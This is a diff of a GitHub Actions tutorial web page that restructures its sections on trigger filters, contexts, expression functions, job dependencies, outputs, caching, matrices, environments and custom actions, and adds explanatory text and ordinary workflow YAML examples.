+            {"text":"❌ CI Failed on \${{ github.repository }}"}
         env:
           SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`)}
 
-${callout("danger","Security: always pin actions","Never use <code>@main</code> or <code>@master</code> for third-party actions in production. A compromised repo could inject malicious code. Use SHA pinning: <code>uses: actions/checkout@8ade135...</code> or at minimum a version tag like <code>@v4</code>.")}
-</section>
+${callout("danger","Security: always pin your actions","Never use <code>@main</code> or <code>@master</code> for third-party actions in production. If that repository is compromised, malicious code runs with your secrets. At minimum use version tags (<code>@v4</code>). For maximum security, pin to a commit SHA.")}
+`)}
 
-<!-- ===== 7. EVENT FILTERS ===== -->
-<section id="filters">
-<h2><span class="sec-icon">🔍</span>Event filters & activity types</h2>
-<p class="desc">Fine-tune exactly when your workflows trigger using filters and activity types. This prevents unnecessary workflow runs and saves CI minutes.</p>
+<!-- ═══════ 7. EVENT FILTERS ═══════ -->
+${sec("filters","07","🔍","Event filters & activity types",
+"Fine-tune exactly which events trigger your workflows using branch filters, path filters, and activity type selectors to eliminate unnecessary runs.",`
 
-${code("Filtering triggers precisely","yaml",`on:
+${theory("Why filtering matters",`
+<p>Without filters, every push to any branch triggers your CI — even if someone edited only a README file. This wastes runner minutes, slows down feedback, and floods the Actions tab with irrelevant runs.</p>
+<p>GitHub provides three filtering mechanisms:</p>
+<ul>
+<li><strong>Branch/tag filters</strong> — Run only when specific branches or tags are affected. Supports glob patterns like <code>release/**</code>.</li>
+<li><strong>Path filters</strong> — Run only when specific files or directories change. Essential for monorepos.</li>
+<li><strong>Activity types</strong> — For events with sub-types (like pull_request), choose exactly which sub-events trigger the workflow (opened, synchronize, labeled, etc.).</li>
+</ul>
+`)}
+
+${code("Comprehensive filtering examples","yaml",`on:
   push:
+    # Branch filters with glob patterns
     branches:
       - main
-      - "release/**"             # release/1.0, release/2.0, etc.
-      - "!release/**-beta"       # Exclude beta releases
+      - "release/**"           # release/1.0, release/2.0
+      - "!release/**-beta"     # Exclude beta releases
     tags:
-      - "v*"                     # v1.0, v2.1.3, etc.
+      - "v*"                   # v1.0, v2.1.3
+    # Path filters — trigger only if these files change
     paths:
       - "src/**"
       - "tests/**"
       - "requirements.txt"
+    # OR: ignore these paths instead
     paths-ignore:
       - "docs/**"
       - "**.md"
+      - ".gitignore"
 
   pull_request:
     branches: [main]
+    # Activity types: which PR events trigger this?
     types:
-      - opened                   # New PR created
-      - synchronize              # New commits pushed to PR
-      - reopened                 # Previously closed PR reopened
+      - opened               # New PR created
+      - synchronize          # New commits pushed to PR
+      - reopened             # Closed PR reopened
+      # NOT triggered by: labeled, assigned, etc.
 
   issues:
     types: [opened, labeled]
 
   release:
-    types: [published]`)}
+    types: [published]       # Only published, not drafted`)}
 
-<h3>Practical example: monorepo filtering</h3>
-${code("Efficient monorepo CI","yaml",`name: Monorepo CI
+<h3>Real-world monorepo filtering</h3>
+<p class="desc">In a monorepo with multiple services, you only want to test the service that changed. Here's how:</p>
+${code("Monorepo CI with path detection","yaml",`name: Monorepo CI
 on:
   push:
     branches: [main]
@@ -733,142 +879,187 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: cd frontend && npm ci && npm test`)}
-</section>
+`)}
 
-<!-- ===== 8. CONTEXTS & EXPRESSIONS ===== -->
-<section id="contexts">
-<h2><span class="sec-icon">📐</span>Contexts, expressions & variables</h2>
-<p class="desc">GitHub Actions provides context objects that give you information about the workflow run, repository, event, and more. Expressions let you dynamically compute values.</p>
+<!-- ═══════ 8. CONTEXTS ═══════ -->
+${sec("contexts","08","📐","Contexts, expressions & variables",
+"Access runtime information, define dynamic values, and use expressions to make your workflows data-driven and intelligent.",`
 
-${code("Contexts and expressions deep dive","yaml",`jobs:
-  context-demo:
+${theory("Understanding contexts",`
+<p>Contexts are <strong>named objects containing runtime information</strong> that GitHub Actions makes available to your workflow. Think of them as read-only dictionaries you can query to learn about the current run.</p>
+<p>You access context values using the <strong>expression syntax</strong>: <code>\${{ context.property }}</code>. This syntax can be used in any YAML value — step names, run commands, conditions, environment variables, and more.</p>
+<p>The most important contexts are:</p>
+<ul>
+<li><strong>github</strong> — Repository name, branch, commit SHA, event details, actor (who triggered it)</li>
+<li><strong>env</strong> — Environment variables defined at workflow, job, or step level</li>
+<li><strong>secrets</strong> — Encrypted values stored in repo/org settings (masked in logs)</li>
+<li><strong>vars</strong> — Non-sensitive configuration variables (visible in logs)</li>
+<li><strong>runner</strong> — Info about the VM: OS, architecture, temp directory</li>
+<li><strong>steps</strong> — Outputs and status of previous steps in the current job</li>
+<li><strong>needs</strong> — Outputs and results of jobs this job depends on</li>
+<li><strong>matrix</strong> — Current matrix combination values (Chapter 13)</li>
+</ul>
+`)}
+
+${code("Contexts and expressions in practice","yaml",`jobs:
+  demo:
     runs-on: ubuntu-latest
     env:
       DEPLOY_ENV: production
-      APP_VERSION: "2.1.0"
 
     steps:
       - uses: actions/checkout@v4
 
-      # github context
-      - name: GitHub context examples
+      # github context — who, what, where
+      - name: GitHub context
         run: |
           echo "Repo: \${{ github.repository }}"
-          echo "SHA: \${{ github.sha }}"
           echo "Branch: \${{ github.ref_name }}"
-          echo "Event: \${{ github.event_name }}"
+          echo "SHA: \${{ github.sha }}"
           echo "Actor: \${{ github.actor }}"
-          echo "Run ID: \${{ github.run_id }}"
-          echo "Run number: \${{ github.run_number }}"
+          echo "Event: \${{ github.event_name }}"
+          echo "Run #: \${{ github.run_number }}"
 
-      # runner context
+      # runner context — the machine
       - name: Runner context
         run: |
           echo "OS: \${{ runner.os }}"
           echo "Arch: \${{ runner.arch }}"
-          echo "Temp dir: \${{ runner.temp }}"
+          echo "Temp: \${{ runner.temp }}"
 
-      # secrets context
-      - name: Using secrets (values are masked in logs)
+      # Secrets are masked with *** in logs
+      - name: Using secrets safely
         env:
           API_KEY: \${{ secrets.API_KEY }}
-        run: echo "API key is set: \${{ secrets.API_KEY != '' }}"
+        run: echo "Key is set: \${{ secrets.API_KEY != '' }}"
 
       # Expressions with operators
-      - name: Conditional step
+      - name: Conditional logic
         if: |
           github.event_name == 'push' &&
           github.ref == 'refs/heads/main' &&
           !contains(github.event.head_commit.message, '[skip ci]')
         run: echo "Running on main, no skip"
 
-      # Setting output variables
-      - name: Set dynamic variables
+      # Setting and using step outputs
+      - name: Set dynamic outputs
         id: vars
         run: |
           echo "version=1.2.3" >> \$GITHUB_OUTPUT
-          echo "timestamp=\$(date -u +%Y%m%d%H%M%S)" >> \$GITHUB_OUTPUT
-          echo "short_sha=\$(git rev-parse --short HEAD)" >> \$GITHUB_OUTPUT
+          echo "sha_short=\$(git rev-parse --short HEAD)" >> \$GITHUB_OUTPUT
 
-      - name: Use dynamic variables
+      - name: Use step outputs
         run: |
-          echo "Version: \${{ steps.vars.outputs.version }}"
-          echo "Timestamp: \${{ steps.vars.outputs.timestamp }}"
-          echo "Tag: \${{ steps.vars.outputs.version }}-\${{ steps.vars.outputs.short_sha }}"`)}
+          echo "v\${{ steps.vars.outputs.version }}"
+          echo "sha: \${{ steps.vars.outputs.sha_short }}"`)}
 
-${callout("info","secrets vs vars","Use <code>secrets</code> for sensitive data (API keys, passwords, tokens) — they're encrypted and masked in logs. Use <code>vars</code> for non-sensitive configuration (URLs, app names, feature flags) — they're visible in logs.")}
-</section>
+${callout("info","secrets vs vars","<strong>secrets:</strong> Encrypted, masked in logs, for sensitive data (API keys, passwords, tokens). Set in Settings → Secrets.<br><strong>vars:</strong> Plain text, visible in logs, for configuration (URLs, app names, feature flags). Set in Settings → Variables.")}
+`)}
 
-<!-- ===== 9. FUNCTIONS ===== -->
-<section id="functions">
-<h2><span class="sec-icon">🧮</span>Functions</h2>
-<p class="desc">GitHub Actions provides built-in functions you can use in expressions. These are essential for conditional logic, string manipulation, and dynamic workflows.</p>
+<!-- ═══════ 9. FUNCTIONS ═══════ -->
+${sec("functions","09","🧮","Functions",
+"Use GitHub's built-in expression functions for conditional logic, string manipulation, JSON parsing, and cache key generation.",`
 
-${code("Built-in functions reference","yaml",`jobs:
-  functions-demo:
+${theory("Built-in function categories",`
+<p>GitHub Actions provides several categories of functions you can use inside <code>\${{ }}</code> expressions:</p>
+<ul>
+<li><strong>Status functions</strong> — <code>success()</code>, <code>failure()</code>, <code>always()</code>, <code>cancelled()</code> — check the outcome of previous steps or jobs</li>
+<li><strong>String functions</strong> — <code>contains()</code>, <code>startsWith()</code>, <code>endsWith()</code>, <code>format()</code> — test and manipulate strings</li>
+<li><strong>JSON functions</strong> — <code>toJSON()</code>, <code>fromJSON()</code> — convert between JSON and workflow values</li>
+<li><strong>Hash functions</strong> — <code>hashFiles()</code> — generate a SHA-256 hash from file contents (essential for cache keys)</li>
+</ul>
+`)}
+
+${code("Functions reference with examples","yaml",`jobs:
+  demo:
     runs-on: ubuntu-latest
     steps:
-      # Status check functions
-      - name: Always run (even if previous steps fail)
+      # ── Status functions ──
+      - name: Always runs (cleanup, notifications)
         if: always()
-        run: echo "I run no matter what"
+        run: echo "Runs even if earlier steps failed"
 
       - name: Only on failure
         if: failure()
-        run: echo "Something broke!"
+        run: echo "Something broke — send alert!"
 
-      - name: Only on success
-        if: success()
-        run: echo "All green!"
-
-      # String functions
-      - name: String manipulation
+      # ── String functions ──
+      - name: String checks
         if: |
           contains(github.event.head_commit.message, '[deploy]') &&
-          startsWith(github.ref, 'refs/heads/release') &&
-          endsWith(github.repository, '-api')
-        run: echo "Deploying release branch of API repo"
+          startsWith(github.ref, 'refs/heads/release')
+        run: echo "Deploy triggered from release branch"
 
-      # format()
       - name: Format strings
-        run: echo "\${{ format('Deploy {0} to {1}', 'v2.0', 'production') }}"
+        run: |
+          echo "\${{ format('Deploying {0} to {1}', 'v2.0', 'prod') }}"
 
-      # JSON functions
-      - name: Parse JSON dynamically
+      # ── JSON functions ──
+      - name: Create JSON output
         id: meta
-        run: echo 'config={"env":"prod","replicas":3}' >> \$GITHUB_OUTPUT
+        run: |
+          echo 'config={"env":"prod","replicas":3}' >> \$GITHUB_OUTPUT
 
-      - name: Use JSON values
+      - name: Parse JSON in expressions
         run: |
           echo "Env: \${{ fromJSON(steps.meta.outputs.config).env }}"
           echo "Replicas: \${{ fromJSON(steps.meta.outputs.config).replicas }}"
 
-      # toJSON for debugging
-      - name: Debug contexts
+      # ── Debug with toJSON ──
+      - name: Dump entire github context
         run: echo '\${{ toJSON(github) }}'
 
-      # hashFiles() for cache keys
+      # ── hashFiles for cache keys ──
       - uses: actions/cache@v3
         with:
           path: ~/.cache/pip
           key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements.txt') }}`)}
+`)}
 
-${callout("info","Type coercion","GitHub Actions automatically converts types in comparisons. The string <code>\"true\"</code> equals the boolean <code>true</code>. Numbers are compared as numbers. Use <code>fromJSON()</code> when you need explicit type control.")}
-</section>
+<!-- ═══════ 10. EXECUTION FLOW ═══════ -->
+${sec("flow","10","🔀","Controlling execution flow",
+"Master job dependencies, conditional execution, error handling, timeouts, and retry strategies to build robust pipelines.",`
 
-<!-- ===== 10. EXECUTION FLOW ===== -->
-<section id="flow">
-<h2><span class="sec-icon">🔀</span>Controlling execution flow</h2>
-<p class="desc">Control when jobs and steps run using conditionals, dependencies, and failure handling strategies.</p>
+${theory("Designing your pipeline topology",`
+<p>By default, all jobs in a workflow run <strong>in parallel</strong>. The <code>needs:</code> keyword creates dependencies between jobs, forcing them to run sequentially. This lets you design multi-stage pipelines where each stage gates the next.</p>
+<p>A typical production pipeline has this shape:</p>
+<ul>
+<li><strong>Stage 1 (parallel):</strong> Lint + Test + Security scan — all run simultaneously for fast feedback</li>
+<li><strong>Stage 2 (sequential):</strong> Build — only if all Stage 1 jobs pass</li>
+<li><strong>Stage 3 (sequential):</strong> Deploy to staging — only if build succeeds</li>
+<li><strong>Stage 4 (sequential):</strong> Deploy to production — only if staging succeeds, often with manual approval</li>
+<li><strong>Stage 5 (always):</strong> Notify — runs regardless of upstream success/failure</li>
+</ul>
+`)}
 
-<h3>Job dependencies with <code>needs:</code></h3>
-${code("Complex job dependency graph","yaml",`name: Full CI/CD Pipeline
+${diagram(`  ┌──────┐  ┌──────┐  ┌──────────┐
+  │ Lint │  │ Test │  │ Security │   ← Stage 1: Parallel
+  └──┬───┘  └──┬───┘  └────┬─────┘
+     │         │            │
+     └─────────┼────────────┘
+               │
+          ┌────▼────┐
+          │  Build  │                ← Stage 2: needs:[lint,test,security]
+          └────┬────┘
+               │
+        ┌──────▼──────┐
+        │   Staging   │              ← Stage 3: needs:[build] + environment
+        └──────┬──────┘
+               │
+      ┌────────▼────────┐
+      │   Production    │            ← Stage 4: needs:[staging] + approval
+      └────────┬────────┘
+               │
+          ┌────▼────┐
+          │ Notify  │  if: always()  ← Always runs
+          └─────────┘`)}
+
+${code("Full pipeline with dependencies and conditions","yaml",`name: Production Pipeline
 on:
   push:
     branches: [main]
 
 jobs:
-  # Stage 1: Parallel checks
   lint:
     runs-on: ubuntu-latest
     steps:
@@ -889,9 +1080,7 @@ jobs:
       - uses: actions/checkout@v4
       - run: pip install safety bandit
       - run: safety check -r requirements.txt
-      - run: bandit -r app.py -ll
 
-  # Stage 2: Build (needs all checks)
   build:
     needs: [lint, test, security]
     runs-on: ubuntu-latest
@@ -899,7 +1088,6 @@ jobs:
       - uses: actions/checkout@v4
       - run: docker build -t myapp:\${{ github.sha }} .
 
-  # Stage 3: Deploy
   deploy-staging:
     needs: build
     runs-on: ubuntu-latest
@@ -909,97 +1097,67 @@ jobs:
 
   deploy-production:
     needs: deploy-staging
+    if: github.ref == 'refs/heads/main'
     runs-on: ubuntu-latest
     environment: production
-    if: github.ref == 'refs/heads/main'
     steps:
-      - run: echo "Deploying to production..."
+      - run: echo "Deploying to production!"
 
-  # Notification: runs even if something fails
   notify:
-    needs: [deploy-staging, deploy-production]
+    needs: [deploy-production]
     if: always()
     runs-on: ubuntu-latest
     steps:
       - run: |
-          if [ "\${{ needs.deploy-production.result }}" == "success" ]; then
-            echo "✅ Pipeline succeeded"
-          else
-            echo "❌ Pipeline had failures"
-          fi`)}
+          echo "Result: \${{ needs.deploy-production.result }}"`)}
 
-${diagram(`Pipeline execution flow:
+<h3>Step-level control patterns</h3>
+${code("Conditions, timeouts, retries","yaml",`steps:
+  - name: Main branch only
+    if: github.ref == 'refs/heads/main'
+    run: echo "On main"
 
-  ┌──────┐  ┌──────┐  ┌──────────┐
-  │ Lint │  │ Test │  │ Security │   Stage 1: Parallel
-  └──┬───┘  └──┬───┘  └────┬─────┘
-     │         │            │
-     └─────────┼────────────┘
-               │
-          ┌────▼────┐
-          │  Build  │                Stage 2: Sequential
-          └────┬────┘
-               │
-        ┌──────▼──────┐
-        │   Staging   │              Stage 3: With approval
-        └──────┬──────┘
-               │
-      ┌────────▼────────┐
-      │   Production    │            Stage 4: Protected
-      └────────┬────────┘
-               │
-          ┌────▼────┐
-          │ Notify  │  if: always()
-          └─────────┘`)}
+  - name: Skip if commit says [skip ci]
+    if: "!contains(github.event.head_commit.message, '[skip ci]')"
+    run: echo "Running CI..."
 
-<h3>Conditional execution patterns</h3>
-${code("if: conditions at step and job level","yaml",`jobs:
-  conditional-demo:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Main branch only
-        if: github.ref == 'refs/heads/main'
-        run: echo "On main"
+  - name: Optional lint (don't fail the build)
+    continue-on-error: true
+    run: flake8 . --count
 
-      - name: Feature branches only
-        if: github.ref != 'refs/heads/main'
-        run: echo "On feature branch"
+  - name: Test with timeout
+    timeout-minutes: 10
+    run: pytest tests/integration/ -v
 
-      - name: Skip if [skip ci]
-        if: "!contains(github.event.head_commit.message, '[skip ci]')"
-        run: echo "Running CI checks..."
+  - name: Flaky test with retry
+    uses: nick-fields/retry@v2
+    with:
+      timeout_minutes: 5
+      max_attempts: 3
+      command: pytest tests/flaky/ -v`)}
+`)}
 
-      - name: Optional lint (don't fail the build)
-        continue-on-error: true
-        run: flake8 . --count
+<!-- ═══════ 11. INPUTS & OUTPUTS ═══════ -->
+${sec("io","11","↔️","Inputs & outputs",
+"Pass data between steps, between jobs, and accept rich user inputs from manual workflow triggers.",`
 
-      - name: Run with timeout
-        timeout-minutes: 10
-        run: pytest tests/integration/ -v
+${theory("How data flows through a pipeline",`
+<p>Data flows in GitHub Actions follow strict scoping rules:</p>
+<ul>
+<li><strong>Step → Step (same job):</strong> Use <code>\$GITHUB_OUTPUT</code> to set outputs, then <code>\${{ steps.STEP_ID.outputs.KEY }}</code> to read them. Since steps share a filesystem, you can also write to files.</li>
+<li><strong>Job → Job:</strong> Declare outputs at the job level using <code>outputs:</code>, then read them in dependent jobs via <code>\${{ needs.JOB_ID.outputs.KEY }}</code>. No filesystem sharing — only string values.</li>
+<li><strong>User → Workflow:</strong> Use <code>workflow_dispatch</code> inputs. GitHub renders a form in the UI where users can fill in values before triggering the run.</li>
+</ul>
+`)}
 
-      - name: Flaky test with retry
-        uses: nick-fields/retry@v2
-        with:
-          timeout_minutes: 5
-          max_attempts: 3
-          command: pytest tests/flaky/ -v`)}
-</section>
-
-<!-- ===== 11. INPUTS & OUTPUTS ===== -->
-<section id="io">
-<h2><span class="sec-icon">↔️</span>Inputs & outputs</h2>
-<p class="desc">Pass data between steps, between jobs, and accept inputs from manual triggers.</p>
-
-${code("Step-to-step and job-to-job data passing","yaml",`jobs:
+${code("Step-to-step and job-to-job outputs","yaml",`jobs:
   build:
     runs-on: ubuntu-latest
     outputs:
       version: \${{ steps.extract.outputs.version }}
       image_tag: \${{ steps.tag.outputs.image_tag }}
-
     steps:
       - uses: actions/checkout@v4
-
       - name: Extract version
         id: extract
         run: |
@@ -1012,21 +1170,14 @@ ${code("Step-to-step and job-to-job data passing","yaml",`jobs:
           TAG="\${{ steps.extract.outputs.version }}-\${{ github.sha }}"
           echo "image_tag=\$TAG" >> \$GITHUB_OUTPUT
 
-      - name: Build with tag
-        run: |
-          echo "Building version \${{ steps.extract.outputs.version }}"
-          echo "Full tag: \${{ steps.tag.outputs.image_tag }}"
-
   deploy:
     needs: build
     runs-on: ubuntu-latest
     steps:
-      - name: Deploy version
-        run: |
+      - run: |
           echo "Deploying v\${{ needs.build.outputs.version }}"
           echo "Image: \${{ needs.build.outputs.image_tag }}"`)}
 
-<h3>Workflow dispatch inputs</h3>
 ${code("Manual trigger with rich inputs","yaml",`on:
   workflow_dispatch:
     inputs:
@@ -1036,7 +1187,7 @@ ${code("Manual trigger with rich inputs","yaml",`on:
         type: choice
         options: [development, staging, production]
       app_version:
-        description: "Version to deploy (e.g., 2.1.0)"
+        description: "Version to deploy"
         required: true
         type: string
       run_migrations:
@@ -1048,22 +1199,34 @@ jobs:
   deploy:
     runs-on: ubuntu-latest
     steps:
-      - name: Deploy
-        run: |
+      - run: |
           echo "🚀 Deploying v\${{ inputs.app_version }}"
-          echo "  to \${{ inputs.target_env }}"
-
-      - name: Migrations
-        if: inputs.run_migrations == true
+          echo "   to \${{ inputs.target_env }}"
+      - if: inputs.run_migrations == true
         run: echo "Running migrations..."`)}
-</section>
+`)}
 
-<!-- ===== 12. CACHING & ARTIFACTS ===== -->
-<section id="caching">
-<h2><span class="sec-icon">💾</span>Sharing data: caching & artifacts</h2>
-<p class="desc">Caching speeds up workflows by reusing files between runs. Artifacts persist files after a workflow completes for download or use by other jobs.</p>
+<!-- ═══════ 12. CACHING & ARTIFACTS ═══════ -->
+${sec("caching","12","💾","Caching & artifacts",
+"Speed up workflows by caching dependencies between runs, and share build outputs between jobs using artifacts.",`
 
-${code("Pip caching strategies","yaml",`jobs:
+${theory("Cache vs artifacts — when to use which",`
+<p>These two features sound similar but serve very different purposes:</p>
+<ul>
+<li><strong>Cache</strong> is for <strong>speeding up workflows</strong>. It stores files (like pip/npm packages) between workflow runs so you don't re-download them every time. Caches are keyed by a hash of your dependency files — when requirements.txt changes, the cache invalidates. Caches expire after 7 days of no access.</li>
+<li><strong>Artifacts</strong> are for <strong>sharing files between jobs</strong> or <strong>persisting output after a run</strong>. Test reports, coverage files, build outputs, Docker images — anything you want to download from the Actions UI or pass to a downstream job. Artifacts can be retained for up to 90 days.</li>
+</ul>
+`)}
+
+${table(["Feature","Cache","Artifacts"],
+[["Purpose","Speed up repeated installs","Share files between jobs / persist outputs"],
+["Lifetime","7 days since last access","1-90 days (configurable)"],
+["Key mechanism","Hash-based key matching","Named upload/download"],
+["Size limit","10 GB per repo","500 MB per artifact (configurable)"],
+["Downloadable from UI","No","Yes"],
+["Use case","pip/npm packages, build tools","Test reports, Docker images, coverage"]])}
+
+${code("Caching pip dependencies","yaml",`jobs:
   test:
     runs-on: ubuntu-latest
     steps:
@@ -1076,81 +1239,67 @@ ${code("Pip caching strategies","yaml",`jobs:
           cache: "pip"
 
       # Method 2: Explicit cache action (more control)
-      - name: Cache pip packages
-        uses: actions/cache@v3
+      - uses: actions/cache@v3
         id: pip-cache
         with:
-          path: |
-            ~/.cache/pip
-            .venv
-          key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements*.txt') }}
-          restore-keys: |
-            pip-\${{ runner.os }}-
+          path: ~/.cache/pip
+          key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements.txt') }}
+          restore-keys: pip-\${{ runner.os }}-
 
-      - name: Install dependencies
-        if: steps.pip-cache.outputs.cache-hit != 'true'
-        run: |
-          python -m venv .venv
-          source .venv/bin/activate
-          pip install -r requirements.txt`)}
+      - run: pip install -r requirements.txt
+      - run: pytest test_app.py -v`)}
 
-<h3>Workflow artifacts</h3>
-${code("Upload and download artifacts between jobs","yaml",`jobs:
+${code("Sharing artifacts between jobs","yaml",`jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with: { python-version: "3.11" }
       - run: pip install -r requirements.txt
-      - run: pytest test_app.py --cov=. --cov-report=html -v
+      - run: pytest --cov=. --cov-report=html -v
 
-      - name: Upload coverage report
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
           name: coverage-report
           path: htmlcov/
           retention-days: 30
 
-      - run: docker build -t myapp:\${{ github.sha }} .
-      - run: docker save myapp:\${{ github.sha }} > myapp-image.tar
-
-      - name: Upload Docker image
-        uses: actions/upload-artifact@v4
-        with:
-          name: docker-image
-          path: myapp-image.tar
-
-  deploy:
+  review:
     needs: build
     runs-on: ubuntu-latest
     steps:
       - uses: actions/download-artifact@v4
         with:
-          name: docker-image
-      - run: |
-          docker load < myapp-image.tar
-          echo "Deploying myapp:\${{ github.sha }}"`)}
+          name: coverage-report
+          path: ./coverage
+      - run: ls -la coverage/`)}
+`)}
 
-${callout("info","Cache vs artifacts","<strong>Cache:</strong> Speeds up workflows by reusing files between runs (same workflow). Auto-evicted after 7 days. Use for dependencies.<br><strong>Artifacts:</strong> Persist files after workflow completes. Can be downloaded from UI. Use for build outputs, test reports, Docker images.")}
-</section>
+<!-- ═══════ 13. MATRICES ═══════ -->
+${sec("matrix","13","📊","Working with matrices",
+"Run the same job across multiple configurations simultaneously — Python versions, operating systems, database backends, and more.",`
 
-<!-- ===== 13. MATRICES ===== -->
-<section id="matrix">
-<h2><span class="sec-icon">📊</span>Working with matrices</h2>
-<p class="desc">Matrix strategies let you run a job with multiple combinations of variables — perfect for testing across Python versions, OSes, or database versions.</p>
+${theory("What is a matrix strategy?",`
+<p>A matrix strategy automatically creates <strong>multiple copies of a job</strong>, each with different variable values. If you define a matrix with 3 Python versions and 2 operating systems, GitHub creates 6 jobs (3×2) that all run in parallel.</p>
+<p>This is incredibly powerful for:</p>
+<ul>
+<li><strong>Cross-version testing:</strong> Ensure your code works on Python 3.9, 3.10, 3.11, and 3.12</li>
+<li><strong>Cross-platform testing:</strong> Verify behavior on Linux, Windows, and macOS</li>
+<li><strong>Database compatibility:</strong> Test against PostgreSQL, MySQL, and SQLite</li>
+</ul>
+<p>You can further refine with <code>include:</code> (add extra combinations), <code>exclude:</code> (skip specific combos), <code>fail-fast:</code> (stop all if one fails), and <code>max-parallel:</code> (limit concurrency).</p>
+`)}
 
-${code("Matrix strategy examples","yaml",`jobs:
-  # Basic matrix: test across Python versions and OS
+${code("Matrix strategies from basic to advanced","yaml",`jobs:
+  # Basic: 4 Python versions × 3 OS = 12 parallel jobs
   test:
     strategy:
       matrix:
         python-version: ["3.9", "3.10", "3.11", "3.12"]
         os: [ubuntu-latest, windows-latest, macos-latest]
       fail-fast: false
-      max-parallel: 4
+      max-parallel: 6
     runs-on: \${{ matrix.os }}
-    name: Py\${{ matrix.python-version }} on \${{ matrix.os }}
+    name: Py\${{ matrix.python-version }} / \${{ matrix.os }}
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
@@ -1160,7 +1309,7 @@ ${code("Matrix strategy examples","yaml",`jobs:
       - run: pytest test_app.py -v
 
   # Advanced: include/exclude specific combinations
-  advanced-test:
+  advanced:
     strategy:
       matrix:
         python-version: ["3.10", "3.11", "3.12"]
@@ -1179,12 +1328,11 @@ ${code("Matrix strategy examples","yaml",`jobs:
       - uses: actions/setup-python@v5
         with:
           python-version: \${{ matrix.python-version }}
-      - run: pip install -r requirements.txt
-      - run: pytest test_app.py -v
+      - run: pytest -v
         env:
           DB_TYPE: \${{ matrix.database }}
 
-  # Dynamic matrix from JSON
+  # Dynamic matrix generated from JSON
   prepare:
     runs-on: ubuntu-latest
     outputs:
@@ -1205,14 +1353,24 @@ ${code("Matrix strategy examples","yaml",`jobs:
     steps:
       - uses: actions/checkout@v4
       - run: cd \${{ matrix.path }} && pytest -v`)}
-</section>
+`)}
 
-<!-- ===== 14. ENVIRONMENTS ===== -->
-<section id="envs">
-<h2><span class="sec-icon">🌍</span>Environments</h2>
-<p class="desc">Environments add protection rules, secrets scoping, and deployment tracking to your workflows.</p>
+<!-- ═══════ 14. ENVIRONMENTS ═══════ -->
+${sec("envs","14","🌍","Environments",
+"Add deployment protection rules, scoped secrets, manual approvals, and deployment tracking to your workflows.",`
 
-${code("Environment configuration and usage","yaml",`jobs:
+${theory("Environments as deployment gates",`
+<p>Environments are a GitHub feature that lets you define <strong>deployment targets</strong> with protection rules. When a job references an environment, GitHub can enforce:</p>
+<ul>
+<li><strong>Required reviewers:</strong> Specific people must approve before the job runs. Essential for production deployments.</li>
+<li><strong>Wait timer:</strong> A delay (e.g., 5 minutes) before the job starts — gives time to cancel accidental deploys.</li>
+<li><strong>Branch restrictions:</strong> Only allow deployments from specific branches (e.g., only <code>main</code> can deploy to production).</li>
+<li><strong>Environment-specific secrets:</strong> Different API keys for staging vs production, scoped so staging workflows can't access production credentials.</li>
+</ul>
+<p>Configure environments in <strong>Settings → Environments</strong> in your repository.</p>
+`)}
+
+${code("Environments in action","yaml",`jobs:
   deploy-staging:
     runs-on: ubuntu-latest
     environment:
@@ -1220,11 +1378,9 @@ ${code("Environment configuration and usage","yaml",`jobs:
       url: https://staging.myapp.com
     steps:
       - uses: actions/checkout@v4
-      - name: Deploy to staging
-        env:
-          AWS_ACCESS_KEY: \${{ secrets.AWS_ACCESS_KEY }}
-          API_ENDPOINT: \${{ vars.API_ENDPOINT }}
-        run: echo "Deploying to staging at \$API_ENDPOINT"
+      - env:
+          AWS_KEY: \${{ secrets.AWS_ACCESS_KEY }}
+        run: echo "Deploying to staging..."
 
   deploy-production:
     needs: deploy-staging
@@ -1232,18 +1388,7 @@ ${code("Environment configuration and usage","yaml",`jobs:
     environment:
       name: production
       url: https://myapp.com
-    if: |
-      github.ref == 'refs/heads/main' &&
-      github.event.repository.fork == false
-    steps:
-      - uses: actions/checkout@v4
-      - name: Deploy
-        run: echo "🚀 Deploying to production!"
-
-  # Docker deployment with GHCR
-  docker-deploy:
-    runs-on: ubuntu-latest
-    environment: production
+    if: github.ref == 'refs/heads/main'
     steps:
       - uses: actions/checkout@v4
       - uses: docker/login-action@v3
@@ -1258,52 +1403,54 @@ ${code("Environment configuration and usage","yaml",`jobs:
           tags: |
             ghcr.io/\${{ github.repository }}:latest
             ghcr.io/\${{ github.repository }}:\${{ github.sha }}`)}
+`)}
 
-${callout("warning","Setting up environment protection","Go to <strong>Settings → Environments → New environment</strong>. Add required reviewers for production. Set a 5-minute wait timer as a safety net. Restrict to only the <code>main</code> branch.")}
-</section>
+<!-- ═══════ 15. CUSTOM ACTIONS ═══════ -->
+${sec("custom","15","⚙️","Developing custom actions from scratch",
+"Build your own reusable actions — composite (YAML-only), Docker, and JavaScript — to encapsulate complex logic into single-line invocations.",`
 
-<!-- ===== 15. CUSTOM ACTIONS ===== -->
-<section id="custom">
-<h2><span class="sec-icon">⚙️</span>Developing custom actions from scratch</h2>
-<p class="desc">When marketplace actions don't fit your needs, build your own. There are three types: JavaScript, composite, and Docker container actions.</p>
+${theory("Three types of custom actions",`
+<ul>
+<li><strong>Composite actions</strong> — Written in pure YAML by combining existing steps. No programming required. Best for: wrapping common step sequences (setup + install + test) into a reusable package.</li>
+<li><strong>Docker container actions</strong> — Packaged as a Docker image. Your action runs in an isolated container with exactly the tools you need. Best for: complex tooling with specific OS-level dependencies.</li>
+<li><strong>JavaScript actions</strong> — Written in Node.js using the <code>@actions/core</code> and <code>@actions/github</code> libraries. Fastest startup. Best for: interacting with the GitHub API, complex logic, maximum performance.</li>
+</ul>
+`)}
 
-<h3>Type 1: Composite action (easiest — YAML only)</h3>
+<h3>Composite action — YAML only, no coding</h3>
 ${code(".github/actions/python-setup/action.yml","yaml",`name: "Python Setup & Test"
-description: "Sets up Python, installs deps, and runs tests"
+description: "Sets up Python, installs deps, runs tests"
 
 inputs:
   python-version:
-    description: "Python version to use"
+    description: "Python version"
     required: false
     default: "3.11"
   requirements-file:
-    description: "Path to requirements file"
+    description: "Path to requirements"
     required: false
     default: "requirements.txt"
 
 outputs:
   test-result:
